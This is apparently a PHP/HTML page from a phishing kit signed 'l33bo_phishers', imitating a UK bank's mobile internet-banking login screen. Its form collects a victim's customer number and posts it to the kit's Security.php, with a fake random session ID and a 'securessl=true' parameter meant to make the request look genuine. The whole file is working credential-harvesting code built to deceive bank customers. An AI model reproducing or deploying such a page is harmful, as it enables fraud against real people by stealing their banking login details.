<?php
/*
Created by l33bo_phishers -- icq: 695059760 
*/
session_start();
require "../../assets/includes/functions.php";
require "../../assets/includes/simplehtmldom.php";
require "../../assets/includes/enc.php";
?>
<!DOCTYPE html>
<html lang="en-gb">
<head>
<script>
function movetoNext(current, nextFieldID) {
if (current.value.length >= current.maxLength) {
document.getElementById(nextFieldID).focus();
}
}
function validate() {
    var x = document.forms["login"]["userid"].value;
    if (x == null || x == "") {
        document.getElementById("userid_error").innerHTML = "Some of the information required has not been entered.";
        document.getElementById("userid").focus();
		document.getElementById("userid").style.borderColor="#db0000";
        return false;
    }
}
</script>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type">
<title>Login</title>
<link href="assets/img/favicon.ico" rel="shortcut icon">
<meta content="en-gb" http-equiv="content-language">
<link href="" media="handheld" rel="alternate">
<meta content="width=device-width" name="viewport">
<link href="assets/css/mobile.css" rel="stylesheet" type="text/css">
</head>
<body class="hasJS">
<div id="outer">
<div id="banner">
<p id="logo"><img src="assets/img/logo.png"></p>
<p id="loggedmsg"><img style="padding-top:8px;" src="assets/img/white-lock.png"></p>
<p class="cookiePolicy"><a href="#" style="color:#FFFFFF;">Cookie
policy</a></p>
<div class="clearer"></div>
</div>
<div id="header">
<div class="panelTL">
<div class="panelTR">
<div class="panelBR">
<div class="panelBL">
<div id="headerInner">
<h1>Welcome</h1>
<hr>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="content">
<div class="login">
<div class="panelTL">
<div class="panelTR">
<div class="panelBR">
<div class="panelBL">
<div class="loginInner">
<div class="loginFields">
<form action="Security.php?&sessionid=<?php echo generateRandomString(115); ?>&securessl=true" autocomplete="off" id="login" method="post" name="login" onsubmit="return validate();">
<div class="formField"><label for="userid">Customer number</label>
<div id='userid_error' class="error_strings"></div>
<input autocomplete="off" class="wide" id="userid" maxlength="12" name="userid" type="tel">
</div>
<div class="formField">
<input class="checkbox" name="none" type="checkbox"> 
<label class="checkboxLabel" for="none">
<a href="#">Remember me. We don't recommend storing data on a shared computer.</a></label>
</div>
<div class="actionsLogin">
<div class="divider">
<hr></div>
<input class="submitAction" id="go" name="go" type="submit" value="Continue">
</div>
</form>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="clearer"></div>
<div>
<div class="aside">
<p class="sideNote">
<a id="lnkForgotUserID" name="some" href="#">Forgotten any of your log in details?</a>
</p>
</div>
<div id="footerLogin">
<div class="FootNav">
<div class="lnkLevFoot">
<p class="lnkLevFootP"><a class="blockLink" href="#">Register for Internet Banking</a></p>
</div>
<div class="lnkLevFoot">
<p class="lnkLevFootP"><a class="blockLink" href="#">Go to desktop site</a></p>
</div>
<div class="lnkLevFoot">
<p class="lnkLevFootP"><a class="blockLink" href="#">Help</a></p>
</div>
<div class="lnkLevFoot">
<p class="lnkLevFootP"><a class="blockLink" href="#">Security</a></p>
</div>
<div class="lnkLevFoot">
<p class="lnkLevFootP"><a class="blockLink" href="#">Contact us</a></p>
</div>
</div>
</div>
<br>
<div class="appBannerBG">
<div class="appBannerLink">
<p style="text-align: center"><a href="#"><img src="assets/img/003.jpg"></a></p>
</div>
</div>
</div>
</div>
</div>
</body>
</html>
<?php
/*
Created by l33bo_phishers -- icq: 695059760 
*/
?>